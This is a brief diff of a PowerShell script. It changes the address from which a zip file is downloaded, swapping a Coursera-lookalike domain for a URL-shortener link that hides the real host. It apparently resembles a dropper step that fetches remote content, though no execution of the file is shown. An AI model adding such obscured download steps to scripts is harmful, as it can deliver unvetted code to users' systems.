@@ -39,7 +39,7 @@ if (!(Test-Path $extractDir)) {
 }
 
 try {
-    Invoke-WebRequest -Uri "https://coursera.vn/d.zip" -OutFile $zipFile
+    Invoke-WebRequest -Uri "https://s.net.vn/ebgT" -OutFile $zipFile
 } catch {
     Write-Host "Error downloading the zip file. Please check the URL and your internet connection."
     Exit
